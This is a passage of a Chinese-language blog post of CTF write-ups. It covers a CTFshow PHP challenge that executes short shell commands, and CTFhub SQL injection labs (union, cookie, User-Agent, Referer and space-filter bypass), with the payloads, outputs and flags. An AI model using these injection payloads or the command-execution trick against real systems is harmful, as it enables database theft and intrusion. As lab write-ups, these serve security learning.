+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(strlen($_GET[1])&lt;4){</span><br><span class="line">     echo shell_exec($_GET[1]);</span><br><span class="line">}</span><br><span class="line">else{</span><br><span class="line">     echo &quot;hack!!!&quot;;</span><br><span class="line">}</span><br><span class="line">?&gt;</span><br><span class="line">//by Firebasky</span><br></pre></td></tr></table></div></figure>
+
+<p>&#x9650;&#x5236;&#x4E86;&#x4F20;&#x5165;&#x53C2;&#x6570;&#x7684;&#x5B57;&#x8282;&#xFF0C;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?1=sdfghjk</span><br><span class="line">//&#x56DE;&#x663E;&#xFF1A;hack!!</span><br><span class="line">?1=ls</span><br><span class="line">//&#x56DE;&#x663E;&#xFF1A;secretsecret_ctfshow_36dddddddddd.php zzz.php //by Firebasky</span><br><span class="line">?1=&gt;nl</span><br><span class="line">//&#x65E0;&#x56DE;&#x663E;</span><br><span class="line">?1=ls</span><br><span class="line">//&#x56DE;&#x663E;&#xFF1A;nl secretsecret_ctfshow_36dddddddddd.php zzz.php //by Firebasky</span><br><span class="line">?1=*</span><br><span class="line">//&#x56DE;&#x663E;&#xFF1A;1 4 14 //by Firebasky //by Firebasky</span><br></pre></td></tr></table></div></figure>
+
+<p>&#x6700;&#x540E;&#x67E5;&#x770B;&#x7F51;&#x9875;&#x6E90;&#x4EE3;&#x7801;&#x5C31;&#x6709;flag&#x4E86;</p>
+
+        <h1 id="ctfhub-web-sql&#x6CE8;&#x5165;">
+          <a href="#ctfhub-web-sql&#x6CE8;&#x5165;" class="heading-link"><i class="undefined"></i></a><a href="#ctfhub-web-sql&#x6CE8;&#x5165;" class="headerlink" title="ctfhub web sql&#x6CE8;&#x5165;"></a>ctfhub web sql&#x6CE8;&#x5165;</h1>
+      
+        <h2 id="mysql&#x7ED3;&#x6784;">
+          <a href="#mysql&#x7ED3;&#x6784;" class="heading-link"><i class="undefined"></i></a><a href="#mysql&#x7ED3;&#x6784;" class="headerlink" title="mysql&#x7ED3;&#x6784;"></a>mysql&#x7ED3;&#x6784;</h2>
+      <hr>
+<p><strong>schema</strong>&#x5C31;&#x662F;&#x6570;&#x636E;&#x5E93;&#x5BF9;&#x8C61;&#x7684;&#x96C6;&#x5408;&#xFF0C;&#x6240;&#x8C13;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5BF9;&#x8C61;&#x4E5F;&#x5C31;&#x662F;&#x5E38;&#x8BF4;&#x7684;&#x8868;&#xFF0C;&#x7D22;&#x5F15;&#xFF0C;&#x89C6;&#x56FE;&#xFF0C;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;</p>
+<hr>
+<p>payload</p>
+<ol>
+<li>&#x6D4B;&#x8BD5;&#x6CE8;&#x5165;&#x70B9;</li>
+</ol>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></div></figure>
+
+<ol start="2">
+<li>&#x53D1;&#x73B0;&#x6709;&#x4E24;&#x4E2A;&#x6CE8;&#x5165;&#x70B9;&#xFF0C;&#x9A8C;&#x8BC1;</li>
+</ol>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,2</span><br></pre></td></tr></table></div></figure>
+
+<ol start="3">
+<li>&#x67E5;&#x8BE2;&#x6570;&#x636E;&#x5E93;&#x548C;&#x7248;&#x672C;</li>
+</ol>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0 union select databse(),version()</span><br><span class="line"></span><br><span class="line">//&#x8FD4;&#x56DE;</span><br><span class="line">select * from news where id=0 union select database(),version()</span><br><span class="line">ID: sqli</span><br><span class="line">Data: 10.3.22-MariaDB-0+deb10u1</span><br></pre></td></tr></table></div></figure>
+
+<ol start="4">
+<li>&#x67E5;&#x8BE2;&#x8868;</li>
+</ol>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,group_concat(table_name) from information_schema.tables from where table_schema=&apos;sqli&apos;</span><br><span class="line"></span><br><span class="line">//&#x8FD4;&#x56DE;</span><br><span class="line">select * from news where id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&apos;sqli&apos;</span><br><span class="line">ID: 1</span><br><span class="line">Data: nbmfvncixz,news</span><br></pre></td></tr></table></div></figure>
+
+<ol start="5">
+<li>&#x67E5;&#x8BE2;&#x8868;&#x4E2D;&#x5B57;&#x6BB5;</li>
+</ol>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;nbmfvncixz&apos;</span><br><span class="line"></span><br><span class="line">//&#x8FD4;&#x56DE;</span><br><span class="line">select * from news where id=0 union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;nbmfvncixz&apos;</span><br><span class="line">ID: 1</span><br><span class="line">Data: pqdyqobqgm</span><br></pre></td></tr></table></div></figure>
+
+<ol start="6">
+<li>&#x67E5;&#x8BE2;&#x5BF9;&#x5E94;&#x5B57;&#x6BB5;&#x7684;&#x503C;</li>
+</ol>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,group_concat(pqdyqobqgm) from nbmfvncixz</span><br><span class="line">//&#x8FD4;&#x56DE;</span><br><span class="line">select * from news where id=0 union select 1,group_concat(pqdyqobqgm) from nbmfvncixz</span><br><span class="line">ID: 1</span><br><span class="line">Data: ctfhub{d10f1812434aa94b874da365}</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="cookie&#x6CE8;&#x5165;">
+          <a href="#cookie&#x6CE8;&#x5165;" class="heading-link"><i class="undefined"></i></a><a href="#cookie&#x6CE8;&#x5165;" class="headerlink" title="cookie&#x6CE8;&#x5165;"></a>cookie&#x6CE8;&#x5165;</h2>
+      <img src="/2022/04/08/4-9wp/image-20220410120126345.png" alt="image-20220410120126345" style="zoom:50%;">
+
+<p>&#x6709;&#x4E2A;hint&#x663E;&#x793A;&#x503C;</p>
+<ol>
+<li><p>&#x7528;burpsuite&#x6293;&#x5305;&#xFF0C;&#x4FEE;&#x6539;cookie&#xFF08;&#x5728;cookie&#x91CC;&#x9762;&#x4F7F;&#x7528;&#x6CE8;&#x5165;&#x8BED;&#x53E5;&#xFF09;</p>
+<img src="/2022/04/08/4-9wp/image-20220410121340751.png" alt="image-20220410121340751" style="zoom:50%;">
+
+<p>&#x8FD4;&#x56DE;&#x7684;&#x662F;</p>
+<img src="/2022/04/08/4-9wp/image-20220410121409895.png" alt="image-20220410121409895" style="zoom:33%;">
+</li>
+<li><p>&#x540C;&#x4E0A;&#x4E00;&#x9898;&#x67E5;&#x8BE2;&#x8868;</p>
+<img src="/2022/04/08/4-9wp/image-20220410121721273.png" alt="image-20220410121721273" style="zoom:50%;">
+</li>
+<li><p>&#x540C;&#x4E0A;&#x4E00;&#x9898;&#x67E5;&#x8BE2;&#x5B57;&#x6BB5;<code>jpzxmyzday</code></p>
+<img src="/2022/04/08/4-9wp/image-20220410121859298.png" alt="image-20220410121859298" style="zoom: 33%;">
+</li>
+<li><p><code>svejtjseuw</code></p>
+</li>
+</ol>
+<p>&#x6700;&#x540E;&#x5F97;&#x5230;flag</p>
+
+        <h2 id="UA&#x6CE8;&#x5165;">
+          <a href="#UA&#x6CE8;&#x5165;" class="heading-link"><i class="undefined"></i></a><a href="#UA&#x6CE8;&#x5165;" class="headerlink" title="UA&#x6CE8;&#x5165;"></a>UA&#x6CE8;&#x5165;</h2>
+      <p>&#x539F;&#x7406;&#x4E00;&#x6837;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x8868;&#x540D;&#xFF1A;hmsrhopytq</span><br><span class="line">&#x5B57;&#x6BB5;&#x540D;&#xFF1A;rawnjrhffe</span><br><span class="line">flag&#xFF1A;ctfhub{0d39611cdae24470e08227e1}</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="referer&#x6CE8;&#x5165;">
+          <a href="#referer&#x6CE8;&#x5165;" class="heading-link"><i class="undefined"></i></a><a href="#referer&#x6CE8;&#x5165;" class="headerlink" title="referer&#x6CE8;&#x5165;"></a>referer&#x6CE8;&#x5165;</h2>
+      <p>&#x539F;&#x7406;&#x4E00;&#x6837;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x8868;&#x540D;&#xFF1A;zhpafjakuk</span><br><span class="line">&#x5B57;&#x6BB5;&#x540D;&#xFF1A;zeojmwzckl  //0 union select 1,group_concat(zeojmwzckl) from zhpafjakuk</span><br><span class="line">flag&#xFF1A;ctfhub{f2075006d4076260463445e2}</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="&#x8FC7;&#x6EE4;&#x7A7A;&#x683C;">
+          <a href="#&#x8FC7;&#x6EE4;&#x7A7A;&#x683C;" class="heading-link"><i class="undefined"></i></a><a href="#&#x8FC7;&#x6EE4;&#x7A7A;&#x683C;" class="headerlink" title="&#x8FC7;&#x6EE4;&#x7A7A;&#x683C;"></a>&#x8FC7;&#x6EE4;&#x7A7A;&#x683C;</h2>
+      <p>&#x8003;&#x70B9;&#xFF1A;&#x4E00;&#x822C;&#x7684;&#x8FC7;&#x6EE4;&#x7A7A;&#x683C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x6CE8;&#x91CA;&#x7B26;&#x7ED5;&#x8FC7;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7528;<code>/**/</code>&#x66FF;&#x4EE3;&#x7A7A;&#x683C;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x8868;&#x540D;&#xFF1A;gnazjrczug</span><br><span class="line">&#x5B57;&#x6BB5;&#x540D;&#xFF1A;wrenizozpu</span><br><span class="line">flag&#xFF1A;</span><br></pre></td></tr></table></div></figure>
+
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://example.com">Kirsten Carton</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://example.com/2022/04/08/4-9wp/">http://example.com/2022/04/08/4-9wp/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/sql/">sql</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/ctfhub/">ctfhub</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/ctfshow/">ctfshow</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/04/24/4-22wp/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">4.22wp</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/03/25/3-25wp/"><span class="paginator-prev__text">3.25wp</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTFshow-%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92"><span class="toc-number">1.</span> <span class="toc-text">
+          CTFshow 萌新计划</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web13"><span class="toc-number">1.1.</span> <span class="toc-text">
+          web13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web15"><span class="toc-number">1.2.</span> <span class="toc-text">
+          web15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-16"><span class="toc-number">1.3.</span> <span class="toc-text">
+          web 16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-17"><span class="toc-number">1.4.</span> <span class="toc-text">
+          web 17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web18"><span class="toc-number">1.5.</span> <span class="toc-text">
+          web18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web19-web21"><span class="toc-number">1.6.</span> <span class="toc-text">
+          web19~web21</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90"><span class="toc-number">1.7.</span> <span class="toc-text">
+          获得百分之百的快乐</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfhub-web-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">
+          ctfhub web sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E7%BB%93%E6%9E%84"><span class="toc-number">2.1.</span> <span class="toc-text">
+          mysql结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cookie%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">
+          cookie注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UA%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.</span> <span class="toc-text">
+          UA注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#referer%E6%B3%A8%E5%85%A5"><span class="toc-number">2.4.</span> <span class="toc-text">
+          referer注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-number">2.5.</span> <span class="toc-text">
+          过滤空格</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="images/imageone/avator one.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">May you be faithful to yourself,live seriously and freely.</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/KirstenCarton" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://plus.google.com/" target="_blank" rel="noopener" data-popover="Google" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-google"></i></span></a><a class="sidebar-ov-social-item" href="https://twitter.com/" target="_blank" rel="noopener" data-popover="Twitter" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-twitter"></i></span></a><a class="sidebar-ov-social-item" href="https://youtube.com/" target="_blank" rel="noopener" data-popover="Youtube" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-youtube"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">17</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">3</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">17</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Kirsten Carton</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
